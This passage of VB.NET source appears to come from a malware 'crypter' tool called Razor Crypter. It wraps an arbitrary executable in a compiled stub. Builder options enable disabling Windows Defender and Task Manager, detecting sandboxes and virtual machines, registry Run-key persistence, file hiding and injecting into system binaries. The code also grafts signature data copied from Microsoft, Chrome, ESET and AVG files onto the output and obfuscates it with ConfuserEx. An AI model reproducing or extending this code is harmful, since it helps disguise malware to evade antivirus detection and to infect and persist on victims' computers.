            'If frmSettings.RadioButton8.Checked = True Then
            '    Me.Signatures = My.Resources.Google_Chrome
            '    File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            'End If
            'If frmSettings.RadioButton9.Checked = True Then
            '    Me.Signatures = My.Resources.Mozilla
            '    File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            'End If
            'If frmSettings.RadioButton10.Checked = True Then
            '    Me.Signatures = My.Resources.ESET
            '    File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            'End If
            'If frmSettings.RadioButton11.Checked = True Then
            '    Me.Signatures = My.Resources.AVG
            '    File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            'End If
            If frmSettings.CheckBox9.Checked = True Then
                Confuser.Obfuscate(Save)
                File.Delete(Save)
            Else
            End If
            MessageBox.Show("File has been successfully crypted." & vbNewLine & vbNewLine & "File Location:" & vbNewLine & Save, ("Razor Crypter"), MessageBoxButtons.OK, MessageBoxIcon.Information)
            If frmSettings.CheckBox8.Checked = True Then
                System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" + Randomization.RandomPassword.Generate(5, 5) + ".cs", RichTextBox1.Text)
            Else
            End If

            RandomModuleName()
            RandomClass()
            Timer1.Stop()
            Timer2.Stop()
            Timer3.Stop()
            Clipboard.SetText(RichTextBox1.Text)
        Catch ex As Exception
        End Try
    End Function
    Public Function Expert()
        Try
            If frmSettings.ComboBox2.Text = "" Then
                TextBox10.Text = "Application.ExecutablePath"
            End If
            If frmSettings.ComboBox2.SelectedItem = "Normal" Then
                TextBox10.Text = "Application.ExecutablePath"
            ElseIf frmSettings.ComboBox2.SelectedItem = "RegAsm" Then
                TextBox10.Text = """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "MsBuild" Then
                TextBox10.Text = """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "vbc" Then
                TextBox10.Text = """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "svchost" Then
                TextBox10.Text = """C:\\Windows\\System32\\svchost.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "schtasks" Then
                TextBox10.Text = """C:\\Windows\\System32\\schtasks.exe"""
            ElseIf frmSettings.ComboBox2.SelectedItem = "explorer" Then
                TextBox10.Text = """C:\\Windows\\explorer.exe"""
            End If
            If frmSettings.RadioButton1.Checked = True Then
                frmSettings.TextBox9.Text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            End If
            If frmSettings.RadioButton2.Checked = True Then
                frmSettings.TextBox9.Text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
            End If
            If frmSettings.ComboBox5.SelectedItem = "AppData" Then
                frmSettings.TextBox14.Text = "Environment.SpecialFolder.ApplicationData"
            ElseIf frmSettings.ComboBox5.SelectedItem = "Desktop" Then
                frmSettings.TextBox14.Text = "Environment.SpecialFolder.Desktop"
            ElseIf frmSettings.ComboBox5.SelectedItem = "Program Files" Then
                frmSettings.TextBox14.Text = "Environment.SpecialFolder.ProgramFiles"
            ElseIf frmSettings.ComboBox5.SelectedItem = "Documents" Then
                frmSettings.TextBox14.Text = "Environment.SpecialFolder.MyDocuments"
            End If
            Dim nbsaWumrcpYk As String = RichTextBox2.Text
            nbsaWumrcpYk = nbsaWumrcpYk.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%3%", RandomString()).Replace("%4%", RandomString()).Replace("%5%", RandomString()).Replace("%28%", RandomString()).Replace("%6%", RandomString()).Replace("%7%", RandomString()).Replace("%8%", RandomString()).Replace("%9%", RandomString()).Replace("%10%", RandomString()).Replace("%11%", RandomString()).Replace("%12%", RandomString()).Replace("%13%", RandomString()).Replace("%14%", RandomString()).Replace("%15%", RandomString()).Replace("%16%", RandomString()).Replace("%17%", RandomString()).Replace("%18%", RandomString()).Replace("%19%", RandomString()).Replace("%20%", RandomString()).Replace("%21%", RandomString()).Replace("%22%", RandomString()).Replace("%23%", RandomString()).Replace("%24%", RandomString()).Replace("%25%", RandomString()).Replace("%44%", RandomString()).Replace("%26%", RandomString()).Replace("%27%", RandomString()).Replace("%29%", RandomString()).Replace("%Razor%", Bzip(File.ReadAllBytes(TextBox1.Text))).Replace("%Title%", frmSettings.TextBox8.Text()).Replace("%Description%", frmSettings.TextBox4.Text()).Replace("%Company%", frmSettings.TextBox5.Text()).Replace("%Product%", frmSettings.TextBox6.Text()).Replace("%Copyright%", frmSettings.TextBox7.Text()).Replace("%A%", frmSettings.NumericUpDown2.Value()).Replace("%B%", frmSettings.NumericUpDown3.Value()).Replace("%C%", frmSettings.NumericUpDown4.Value()).Replace("%E%", frmSettings.NumericUpDown5.Value()).Replace("%Path%", TextBox2.Text()).Replace("%Download Name%", frmSettings.TextBox3.Text()).Replace("%Link%", frmSettings.TextBox2.Text()).Replace("%Inject%", TextBox10.Text()).Replace("%Sleep%", frmSettings.TextBox1.Text + "000").Replace("%Task Kill%", frmSettings.TextBox10.Text).Replace("%30%", RandomString()).Replace("%31%", RandomString()).Replace("%32%", RandomString()).Replace("%33%", RandomString()).Replace("%34%", RandomString()).Replace("%FolderName%", frmSettings.TextBox11.Text()).Replace("%Folder Path%", frmSettings.TextBox14.Text()).Replace("%Name%", frmSettings.TextBox12.Text()).Replace("%Startup File Name%", frmSettings.TextBox13.Text()).Replace("%35%", RandomString()).Replace("%36%", RandomString()).Replace("%37%", RandomString()).Replace("%Regedit%", frmSettings.TextBox9.Text())
            RichTextBox2.Text = nbsaWumrcpYk
            If frmSettings.CheckBox6.Checked Then
                Timer1.Start()
                Timer2.Start()
                ResponsiveSleep(frmSettings.NumericUpDown1.Value)
            Else
            End If
            If frmSettings.CheckBox7.Checked Then
                Timer3.Start()
                ResponsiveSleep(frmSettings.NumericUpDown1.Value)
            Else
            End If
            If frmSettings.CheckBox12.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Task Kill", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Task Kill", "//" + RandomString())
            End If
            If frmSettings.CheckBox10.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Sleep", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Sleep", "//" + RandomString())
            End If
            If frmSettings.CheckBox4.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Disable Task Manager", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Disable Task Manager", "//" + RandomString())
            End If
            If frmSettings.CheckBox14.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Normal Startup", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Normal Startup", "//" + RandomString())
            End If
            If frmSettings.CheckBox13.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Hide File", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Hide File", "//" + RandomString())
            End If
            If frmSettings.CheckBox11.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Download", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Download", "//" + RandomString())
            End If
            If frmSettings.CheckBox5.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Disable Windows Defender", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Disable Windows Defender", "//" + RandomString())
            End If
            If frmSettings.CheckBox3.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Detect SandBoxie", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Detect SandBoxie", "//" + RandomString())
            End If
            If frmSettings.CheckBox2.Checked = True Then
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Detect Virtual Machine", Nothing)
            Else
                RichTextBox2.Text = Replace(RichTextBox2.Text, "//Detect Virtual Machine", "//" + RandomString())
            End If
            Codedom(Save, RichTextBox2.Text, Nothing)
            If TextBox3.Text = "" Then
            Else
                IconInjector.InjectIcon(Save, TextBox3.Text)
            End If
            If frmSettings.RadioButton7.Checked = True Then
                Me.Signatures = My.Resources.Microsoft_Corporation
                File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            End If
            If frmSettings.RadioButton8.Checked = True Then
                Me.Signatures = My.Resources.Google_Chrome
                File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            End If
            If frmSettings.RadioButton9.Checked = True Then
                Me.Signatures = My.Resources.Mozilla
                File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            End If
            If frmSettings.RadioButton10.Checked = True Then
                Me.Signatures = My.Resources.ESET
                File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            End If
            If frmSettings.RadioButton11.Checked = True Then
                Me.Signatures = My.Resources.AVG
                File.WriteAllBytes((Save & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save), Me.Signatures, frmMain.Digital_Signature))
            End If
            If frmSettings.CheckBox9.Checked = True Then
                Confuser.Obfuscate(Save)
                File.Delete(Save)
            Else
            End If
            MessageBox.Show("File has been successfully crypted." & vbNewLine & vbNewLine & "File Location:" & vbNewLine & Save, ("Razor Crypter"), MessageBoxButtons.OK, MessageBoxIcon.Information)
            If frmSettings.CheckBox8.Checked = True Then
                System.IO.File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) & "\" + Randomization.RandomPassword.Generate(5, 5) + ".cs", RichTextBox2.Text)
            Else
            End If

            Timer1.Stop()
            Timer2.Stop()
            Timer3.Stop()
            Clipboard.SetText(RichTextBox2.Text)
        Catch ex As Exception
        End Try
    End Function
    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Try
            If (ProgressBar1.Value < 100) Then
                ProgressBar1.Value = (ProgressBar1.Value + 1)
            ElseIf (ProgressBar1.Value = 100) Then
                Timer4.Enabled = False
                ProgressBar1.Value = 0
                Dim HjzgwMHDSQHZ As String = (Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + ("/" + ModuleName + ".exe"))
                Save = HjzgwMHDSQHZ
                If TextBox1.Text = "" Then
                Else
                    If TextBox15.Text = "" Then
                        Normal()
                    Else
                        Expert()
                    End If
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Button6_Click(sender As Object, e As EventArgs)
        Me.Hide()
        frmSettings.Hide()

    End Sub
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Stub Files (*.dll)|*.dll"
        If Open.ShowDialog = vbOK Then
            TextBox15.Text = Open.FileName
            Dim mFnVNXhovJpybisQWwWTQCOvv As IO.StreamReader
            mFnVNXhovJpybisQWwWTQCOvv = IO.File.OpenText(Open.FileName)
            RichTextBox2.Text = mFnVNXhovJpybisQWwWTQCOvv.ReadToEnd()
            mFnVNXhovJpybisQWwWTQCOvv.Close()
        End If
    End Sub
    Private Sub frmMain_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        Environment.Exit(1)
    End Sub
End Class
#End Region
#Region "Randomization"
Public Class Randomization
    Public Class RandomPassword
        Private Shared DEFAULT_MIN_PASSWORD_LENGTH As Integer = 8
        Private Shared DEFAULT_MAX_PASSWORD_LENGTH As Integer = 10
        Private Shared PASSWORD_CHARS_LCASE As String = "abcdefgijkmnopqrstwxyz"
        Private Shared PASSWORD_CHARS_UCASE As String = "ABCDEFGHJKLMNPQRSTWXYZ"
        Public Shared Function Generate() As String
            Generate = Generate(DEFAULT_MIN_PASSWORD_LENGTH,
                                DEFAULT_MAX_PASSWORD_LENGTH)
        End Function
        Public Shared Function Generate(ByVal length As Integer) As String
            Generate = Generate(length, length)
        End Function
        Public Shared Function Generate(ByVal minLength As Integer,
                                ByVal maxLength As Integer) _
          As String
            If (minLength <= 0 Or maxLength <= 0 Or minLength > maxLength) Then
                Generate = Nothing
            End If
            Dim charGroups As Char()() = New Char()() _
            {
                PASSWORD_CHARS_LCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray(), PASSWORD_CHARS_UCASE.ToCharArray()}
            Dim charsLeftInGroup As Integer() = New Integer(charGroups.Length - 1) {}
            Dim I As Integer
            For I = 0 To charsLeftInGroup.Length - 1
                charsLeftInGroup(I) = charGroups(I).Length
            Next
            Dim leftGroupsOrder As Integer() = New Integer(charGroups.Length - 1) {}
            For I = 0 To leftGroupsOrder.Length - 1
                leftGroupsOrder(I) = I
            Next
            Dim randomBytes As Byte() = New Byte(3) {}
            Dim rng As RNGCryptoServiceProvider = New RNGCryptoServiceProvider()
            rng.GetBytes(randomBytes)
            Dim seed As Integer = ((randomBytes(0) And &H7F) << 24 Or
                                    randomBytes(1) << 16 Or
                                    randomBytes(2) << 8 Or
                                    randomBytes(3))
            Dim random As Random = New Random(seed)
            Dim password As Char() = Nothing
            If (minLength < maxLength) Then
                password = New Char(random.Next(minLength - 1, maxLength)) {}
            Else
                password = New Char(minLength - 1) {}
            End If
            Dim nextCharIdx As Integer
            Dim nextGroupIdx As Integer
            Dim nextLeftGroupsOrderIdx As Integer
            Dim lastCharIdx As Integer
            Dim lastLeftGroupsOrderIdx As Integer = leftGroupsOrder.Length - 1
            For I = 0 To password.Length - 1
                If (lastLeftGroupsOrderIdx = 0) Then
                    nextLeftGroupsOrderIdx = 0
                Else
                    nextLeftGroupsOrderIdx = random.Next(0, lastLeftGroupsOrderIdx)
                End If
                nextGroupIdx = leftGroupsOrder(nextLeftGroupsOrderIdx)
                lastCharIdx = charsLeftInGroup(nextGroupIdx) - 1
                If (lastCharIdx = 0) Then
                    nextCharIdx = 0
                Else
                    nextCharIdx = random.Next(0, lastCharIdx + 1)
                End If
                password(I) = charGroups(nextGroupIdx)(nextCharIdx)
                If (lastCharIdx = 0) Then
                    charsLeftInGroup(nextGroupIdx) =
                                    charGroups(nextGroupIdx).Length
                Else
                    If (lastCharIdx <> nextCharIdx) Then
                        Dim temp As Char = charGroups(nextGroupIdx)(lastCharIdx)
                        charGroups(nextGroupIdx)(lastCharIdx) =
                                    charGroups(nextGroupIdx)(nextCharIdx)
                        charGroups(nextGroupIdx)(nextCharIdx) = temp
                    End If

                    charsLeftInGroup(nextGroupIdx) =
                               charsLeftInGroup(nextGroupIdx) - 1
                End If
                If (lastLeftGroupsOrderIdx = 0) Then
                    lastLeftGroupsOrderIdx = leftGroupsOrder.Length - 1
                Else
                    If (lastLeftGroupsOrderIdx <> nextLeftGroupsOrderIdx) Then
                        Dim temp As Integer =
                                    leftGroupsOrder(lastLeftGroupsOrderIdx)
                        leftGroupsOrder(lastLeftGroupsOrderIdx) =
                                    leftGroupsOrder(nextLeftGroupsOrderIdx)
                        leftGroupsOrder(nextLeftGroupsOrderIdx) = temp
                    End If
                    lastLeftGroupsOrderIdx = lastLeftGroupsOrderIdx - 1
                End If
            Next
            Generate = New String(password)
        End Function
    End Class
End Class
#End Region
#Region "Icon Injector"
Public Class IconInjector

    <SuppressUnmanagedCodeSecurity()>
    Private Class NativeMethods
        <DllImport("kernel32")>
        Public Shared Function BeginUpdateResource(
            ByVal fileName As String,
            <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
        End Function

        <DllImport("kernel32")>
        Public Shared Function UpdateResource(
            ByVal hUpdate As IntPtr,
            ByVal type As IntPtr,
            ByVal name As IntPtr,
            ByVal language As Short,
            <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)>
            ByVal data() As Byte,
            ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("kernel32")>
        Public Shared Function EndUpdateResource(
            ByVal hUpdate As IntPtr,
            <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
    End Class

    ' The first structure in an ICO file lets us know how many images are in the file.
    <StructLayout(LayoutKind.Sequential)>
    Private Structure ICONDIR
        Public Reserved As UShort  ' Reserved, must be 0
        Public Type As UShort      ' Resource type, 1 for icons.
        Public Count As UShort     ' How many images.
        ' The native structure has an array of ICONDIRENTRYs as a final field.
    End Structure

    ' Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
    ' starts in the file. The other fields give the information required to turn that image data into a valid
    ' bitmap.
    <StructLayout(LayoutKind.Sequential)>
    Private Structure ICONDIRENTRY
        Public Width As Byte            ' Width, in pixels, of the image
        Public Height As Byte           ' Height, in pixels, of the image
        Public ColorCount As Byte       ' Number of colors in image (0 if >=8bpp)
        Public Reserved As Byte         ' Reserved ( must be 0)
        Public Planes As UShort         ' Color Planes
        Public BitCount As UShort       ' Bits per pixel
        Public BytesInRes As Integer   ' Length in bytes of the pixel data
        Public ImageOffset As Integer  ' Offset in the file where the pixel data starts.
    End Structure

    ' Each image is stored in the file as an ICONIMAGE structure:
    'typdef struct
    '{
    '   BITMAPINFOHEADER   icHeader;      // DIB header
    '   RGBQUAD         icColors[1];   // Color table
    '   BYTE            icXOR[1];      // DIB bits for XOR mask
    '   BYTE            icAND[1];      // DIB bits for AND mask
    '} ICONIMAGE, *LPICONIMAGE;


    <StructLayout(LayoutKind.Sequential)>
    Private Structure BITMAPINFOHEADER
        Public Size As UInteger
        Public Width As Integer
        Public Height As Integer
        Public Planes As UShort
        Public BitCount As UShort
        Public Compression As UInteger
        Public SizeImage As UInteger
        Public XPelsPerMeter As Integer
        Public YPelsPerMeter As Integer
        Public ClrUsed As UInteger
        Public ClrImportant As UInteger
    End Structure

    ' The icon in an exe/dll file is stored in a very similar structure:
    <StructLayout(LayoutKind.Sequential, Pack:=2)>
    Private Structure GRPICONDIRENTRY
        Public Width As Byte
        Public Height As Byte
        Public ColorCount As Byte
        Public Reserved As Byte
        Public Planes As UShort
        Public BitCount As UShort
        Public BytesInRes As Integer
        Public ID As UShort
    End Structure

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
        InjectIcon(exeFileName, iconFileName, 1, 1)
    End Sub

    Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String, ByVal iconGroupID As UInteger, ByVal iconBaseID As UInteger)
        Const RT_ICON = 3UI
        Const RT_GROUP_ICON = 14UI
        Dim iconFile As IconFile = IconFile.FromFile(iconFileName)
        Dim hUpdate = NativeMethods.BeginUpdateResource(exeFileName, False)
        Dim data = iconFile.CreateIconGroupData(iconBaseID)
        NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_GROUP_ICON), New IntPtr(iconGroupID), 0, data, data.Length)
        For i = 0 To iconFile.ImageCount - 1
            Dim image = iconFile.ImageData(i)
            NativeMethods.UpdateResource(hUpdate, New IntPtr(RT_ICON), New IntPtr(iconBaseID + i), 0, image, image.Length)
        Next
        NativeMethods.EndUpdateResource(hUpdate, False)
    End Sub

    Private Class IconFile

        Private iconDir As New ICONDIR
        Private iconEntry() As ICONDIRENTRY
        Private iconImage()() As Byte

        Public ReadOnly Property ImageCount As Integer
            Get
                Return iconDir.Count
            End Get
        End Property

        Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
            Get
                Return iconImage(index)
            End Get
        End Property

        Private Sub New()
        End Sub

        Public Shared Function FromFile(ByVal filename As String) As IconFile
            Dim instance As New IconFile
            ' Read all the bytes from the file.
            Dim fileBytes() As Byte = IO.File.ReadAllBytes(filename)
            ' First struct is an ICONDIR
            ' Pin the bytes from the file in memory so that we can read them.
            ' If we didn't pin them then they could move around (e.g. when the
            ' garbage collector compacts the heap)
            Dim pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned)
            ' Read the ICONDIR
            instance.iconDir = DirectCast(Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(ICONDIR)), ICONDIR)
            ' which tells us how many images are in the ico file. For each image, there's a ICONDIRENTRY, and associated pixel data.
            instance.iconEntry = New ICONDIRENTRY(instance.iconDir.Count - 1) {}
            instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
            ' The first ICONDIRENTRY will be immediately after the ICONDIR, so the offset to it is the size of ICONDIR
            Dim offset = Marshal.SizeOf(instance.iconDir)
            ' After reading an ICONDIRENTRY we step forward by the size of an ICONDIRENTRY            
            Dim iconDirEntryType = GetType(ICONDIRENTRY)
            Dim size = Marshal.SizeOf(iconDirEntryType)
            For i = 0 To instance.iconDir.Count - 1
                ' Grab the structure.
                Dim entry = DirectCast(Marshal.PtrToStructure(New IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), ICONDIRENTRY)
                instance.iconEntry(i) = entry
                ' Grab the associated pixel data.
                instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                offset += size
            Next
            pinnedBytes.Free()
            Return instance
        End Function

        Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
            ' This will store the memory version of the icon.
            Dim sizeOfIconGroupData As Integer = Marshal.SizeOf(GetType(ICONDIR)) + Marshal.SizeOf(GetType(GRPICONDIRENTRY)) * ImageCount
            Dim data(sizeOfIconGroupData - 1) As Byte
            Dim pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned)
            Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
            Dim offset = Marshal.SizeOf(iconDir)
            For i = 0 To ImageCount - 1
                Dim grpEntry As New GRPICONDIRENTRY
                Dim bitmapheader As New BITMAPINFOHEADER
                Dim pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned)
                Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, Marshal.SizeOf(GetType(BITMAPINFOHEADER)))
                pinnedBitmapInfoHeader.Free()
                grpEntry.Width = iconEntry(i).Width
                grpEntry.Height = iconEntry(i).Height
                grpEntry.ColorCount = iconEntry(i).ColorCount
                grpEntry.Reserved = iconEntry(i).Reserved
                grpEntry.Planes = bitmapheader.Planes
                grpEntry.BitCount = bitmapheader.BitCount
                grpEntry.BytesInRes = iconEntry(i).BytesInRes
                grpEntry.ID = CType(iconBaseID + i, UShort)
                Marshal.StructureToPtr(grpEntry, New IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                offset += Marshal.SizeOf(GetType(GRPICONDIRENTRY))
            Next
            pinnedData.Free()
            Return data
        End Function

    End Class

End Class
#End Region
#Region "Digital Signature"
Public Class GDigital
    Public Shared Function Digital_Signatures(Razor As String) As String
        Try
            Dim length As Integer = Razor.Length
            Dim array As Char() = New Char(length - 1) {}
            For i As Integer = 0 To array.Length - 1
                Dim c As Char = Razor(i)
                Dim b As Byte = CByte((CInt(AscW(c)) Xor length - i))
                Dim b2 As Byte
                array(i) = CChar(ChrW((CInt(b2) << 8 Or CInt(b))))
            Next
            Return String.Intern(New String(array))
        Catch ex As Exception
        End Try
    End Function
End Class
Friend Class Digital
    Public Shared Function Digital_Signatures(ByVal Signatures As Byte(), ByVal Digital_Signature As Boolean) As Byte()
        Try
            Dim buffer As Byte() = New Byte(4 - 1) {}
            Dim stream As New MemoryStream(Signatures, 0, Signatures.Length)
            stream.Seek(60, SeekOrigin.Begin)
            stream.Read(buffer, 0, 2)
            Dim num As Integer = BitConverter.ToInt16(buffer, 0)
            If Digital_Signature Then
                stream.Seek(CLng((num + &HA8)), SeekOrigin.Begin)
                stream.Read(buffer, 0, 4)
                Dim num2 As Integer = BitConverter.ToInt32(buffer, 0)
                stream.Read(buffer, 0, 4)
                Dim num3 As Integer = BitConverter.ToInt32(buffer, 0)
                Dim buffer2 As Byte() = New Byte(num3 - 1) {}
                stream.Seek(CLng(num2), SeekOrigin.Begin)
                stream.Read(buffer2, 0, num3)
                stream.Close()
                Return buffer2
            End If
            stream.Seek(CLng((num + &H98)), SeekOrigin.Begin)
            stream.Read(buffer, 0, 4)
            Dim num4 As Integer = BitConverter.ToInt32(buffer, 0)
            stream.Read(buffer, 0, 4)
            Dim count As Integer = BitConverter.ToInt32(buffer, 0)
            Dim buffer3 As Byte() = New Byte(count - 1) {}
            stream.Seek(CLng(num4), SeekOrigin.Begin)
            stream.Read(buffer3, 0, count)
            stream.Close()
            Return buffer3
        Catch exception As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function smethod_1(ByVal Signatures As Byte(), ByVal int_0 As Integer, ByVal int_1 As Integer, ByVal Digital_Signature As Boolean) As Byte()
        Dim buffer As Byte() = New Byte(4 - 1) {}
        Dim stream As New MemoryStream(Signatures, 0, Signatures.Length)
        If Digital_Signature Then
            stream.Seek(60, SeekOrigin.Begin)
            stream.Read(buffer, 0, 2)
            Dim num As Integer = BitConverter.ToInt16(buffer, 0)
            stream.Seek(CLng((num + 160)), SeekOrigin.Begin)
        Else
            stream.Seek(60, SeekOrigin.Begin)
            stream.Read(buffer, 0, 2)
            Dim num2 As Integer = BitConverter.ToInt16(buffer, 0)
            stream.Seek(CLng((num2 + &H98)), SeekOrigin.Begin)
        End If
        stream.Write(BitConverter.GetBytes(int_1), 0, 4)
        stream.Write(BitConverter.GetBytes(int_0), 0, 4)
        Return stream.ToArray
    End Function
    Public Shared Function Signature(ByVal Signatures As Byte(), ByVal byte_1 As Byte(), ByVal Digital_Signature As Boolean) As Byte()
        Try
            Dim stream As New MemoryStream(byte_1, 0, byte_1.Length)
            Dim buffer As Byte() = New Byte(stream.Length - 1) {}
            stream.Read(buffer, 0, Convert.ToInt32(stream.Length))
            stream.Close()
            Dim stream2 As New MemoryStream(Signatures, 0, Signatures.Length)
            Dim buffer2 As Byte() = New Byte(stream2.Length - 1) {}
            stream2.Read(buffer2, 0, Convert.ToInt32(stream2.Length))
            stream.Close()
            Dim count As Integer = (buffer2.Length + buffer.Length)
            Dim stream3 As New MemoryStream(New Byte(count - 1) {}, 0, count, True, True)
            stream3.Write(buffer2, 0, buffer2.Length)
            stream3.Write(buffer, 0, buffer.Length)
            Dim buffer3 As Byte() = stream3.GetBuffer
            Return Digital.smethod_1(buffer3, buffer.Length, buffer2.Length, Digital_Signature)
        Catch exception As Exception
            Return New Byte(0 - 1) {}
        End Try
    End Function
    Public Shared Function smethod_3(ByVal Signatures As Byte()) As String
        Dim str2 As String
        Dim num As UInt16 = 0
        Dim str As String = String.Empty
        Try
            Using stream As MemoryStream = New MemoryStream(Signatures, 0, Signatures.Length)
                Using reader As BinaryReader = New BinaryReader(stream)
                    If (reader.ReadUInt16 = &H5A4D) Then
                        stream.Seek(&H3A, SeekOrigin.Current)
                        stream.Seek(CLng(reader.ReadUInt32), SeekOrigin.Begin)
                        If (reader.ReadUInt32 = &H4550) Then
                            stream.Seek(20, SeekOrigin.Current)
                            num = reader.ReadUInt16
                        End If
                    End If
                End Using
            End Using
            Select Case num
                Case &H10B
                    str = GDigital.Digital_Signatures("6ĶɁͫѵ")
                    frmMain.Digital_Signature = False
                    Return str
                Case &H20B
                    str = GDigital.Digital_Signatures("3İɁͫѵ")
                    frmMain.Digital_Signature = True
                    Exit Select
                Case 0
                    Throw New Exception
            End Select
            Return str
        Catch exception1 As Exception
            str2 = GDigital.Digital_Signatures("AũɰͤѨժ٦ܠ")
        End Try
        Return str2
    End Function
End Class
#End Region
#Region "Obfuscator"
Friend Class Confuser
    Public Shared Sub Obfuscate(hSlyGQfwnjPpVOnmKFKsqFmQh As String)
        Try
            Dim text As String = Path.GetTempPath() + "configconfuser.crproj"
            Dim text2 As String = My.Resources.config
            Dim text3 As String = Path.GetTempPath() + "Confuser"
            Dim text4 As String = New FileInfo(hSlyGQfwnjPpVOnmKFKsqFmQh).Directory.ToString()
            text2 = text2.Replace("%path%", text4 + "\" + Randomization.RandomPassword.Generate(5, 5)).Replace("%basedir%", text4).Replace("%stub%", hSlyGQfwnjPpVOnmKFKsqFmQh)
            File.WriteAllText(text, text2)
            File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", My.Resources.ConfuserEx)
            If Directory.Exists(text3) Then
                Directory.Delete(text3, True)
            End If
            Directory.CreateDirectory(text3)
            ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", text3)
            Dim process As Process = Process.Start(New ProcessStartInfo() With {.FileName = text3 + "\Confuser.CLI.exe", .UseShellExecute = True, .WindowStyle = ProcessWindowStyle.Hidden, .Arguments = "-n " + text})
            process.WaitForExit()
